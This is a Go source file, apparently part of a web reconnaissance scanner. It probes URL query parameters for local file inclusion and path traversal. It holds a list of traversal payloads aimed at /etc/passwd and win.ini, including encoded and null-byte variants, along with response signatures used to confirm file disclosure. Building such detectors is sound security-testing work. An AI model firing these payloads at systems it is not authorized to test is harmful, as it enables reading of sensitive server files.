package lfi

import (
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/bytezora/recon-x/internal/finding"
	"github.com/bytezora/recon-x/internal/httpclient"
)

type Result struct {
	URL      string
	Param    string
	Payload  string
	Evidence string
	OS       string // "linux", "windows", "unknown"
	Detected bool
}

func (r Result) ToFinding() finding.Finding {
	return finding.Finding{
		Type:               "lfi",
		Severity:           finding.High,
		Confidence:         finding.Likely,
		Title:              "Local File Inclusion / Path Traversal — parameter: " + r.Param,
		AffectedURL:        r.URL,
		Evidence:           r.Evidence,
		Reason:             "Path traversal payload returned file content signatures (OS: " + r.OS + ")",
		Remediation:        "Validate and sanitize file paths. Use allowlists for permitted file access. Disable directory traversal.",
		ManualVerification: true,
	}
}

type lfiPayload struct {
	payload string
	os      string
}

var payloads = []lfiPayload{
	{"../../etc/passwd", "linux"},
	{"....//....//etc/passwd", "linux"},
	{"%2e%2e%2fetc%2fpasswd", "linux"},
	{"..%2f..%2fetc%2fpasswd", "linux"},
	{"../../etc/passwd%00", "linux"},
	{`..\..\windows\win.ini`, "windows"},
	{"..%5c..%5cwindows%5cwin.ini", "windows"},
}

type signature struct {
	pattern string
	os      string
}

var linuxSigs = []signature{
	{"root:x:0:0", "linux"},
	{"daemon:", "linux"},
	{"bin/bash", "linux"},
	{"bin/sh", "linux"},
}

var windowsSigs = []signature{
	{"[extensions]", "windows"},
	{"[fonts]", "windows"},
	{"for 16-bit app support", "windows"},
}

var errorSigs = []string{
	"No such file",
	"failed to open stream",
	"include_path",
}

func detectOS(body string) (string, string) {
	lower := strings.ToLower(body)
	for _, sig := range linuxSigs {
		if strings.Contains(lower, strings.ToLower(sig.pattern)) {
			return sig.os, sig.pattern
		}
	}
	for _, sig := range windowsSigs {
		if strings.Contains(lower, strings.ToLower(sig.pattern)) {
			return sig.os, sig.pattern
		}
	}
	return "", ""
}

func testURL(client *http.Client, rawURL string) []Result {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	params := parsed.Query()
	if len(params) == 0 {
		return nil
	}

	var results []Result
	seen := map[string]bool{}

	for param := range params {
		for _, p := range payloads {
			testParams := cloneParams(params)
			testParams.Set(param, p.payload)
			testU := *parsed
			testU.RawQuery = testParams.Encode()

			key := param + "|" + p.payload
			if seen[key] {
				continue
			}

			req, err := http.NewRequest("GET", testU.String(), nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; recon-x)")
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			data, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
			resp.Body.Close()
			body := string(data)

			detectedOS, evidence := detectOS(body)
			if detectedOS != "" {
				seen[key] = true
				results = append(results, Result{
					URL:      rawURL,
					Param:    param,
					Payload:  p.payload,
					Evidence: "File content signature found: " + evidence,
					OS:       detectedOS,
					Detected: true,
				})
				continue
			}

			lower := strings.ToLower(body)
			for _, errSig := range errorSigs {
				if strings.Contains(lower, strings.ToLower(errSig)) {
					seen[key] = true
					results = append(results, Result{
						URL:      rawURL,
						Param:    param,
						Payload:  p.payload,
						Evidence: "LFI error indicator: " + errSig,
						OS:       "unknown",
						Detected: true,
					})
					break
				}
			}
		}
	}
	return results
}

func Detect(urls []string, threads int, onFound func(Result)) []Result {
	if threads <= 0 {
		threads = 10
	}
	client := httpclient.New(15*time.Second, false)

	var (
		mu      sync.Mutex
		results []Result
		wg      sync.WaitGroup
		sem     = make(chan struct{}, threads)
		seen    = make(map[string]bool)
	)

	for _, rawURL := range urls {
		sem <- struct{}{}
		wg.Add(1)
		go func(u string) {
			defer func() { <-sem; wg.Done() }()
			found := testURL(client, u)
			if len(found) > 0 {
				mu.Lock()
				for _, r := range found {
					key := r.URL + "|" + r.Param + "|" + r.Payload
					if !seen[key] {
						seen[key] = true
						results = append(results, r)
						if onFound != nil {
							onFound(r)
						}
					}
				}
				mu.Unlock()
			}
		}(rawURL)
	}
	wg.Wait()
	return results
}

func cloneParams(src url.Values) url.Values {
	dst := url.Values{}
	for k, v := range src {
		dst[k] = append([]string{}, v...)
	}
	return dst
}
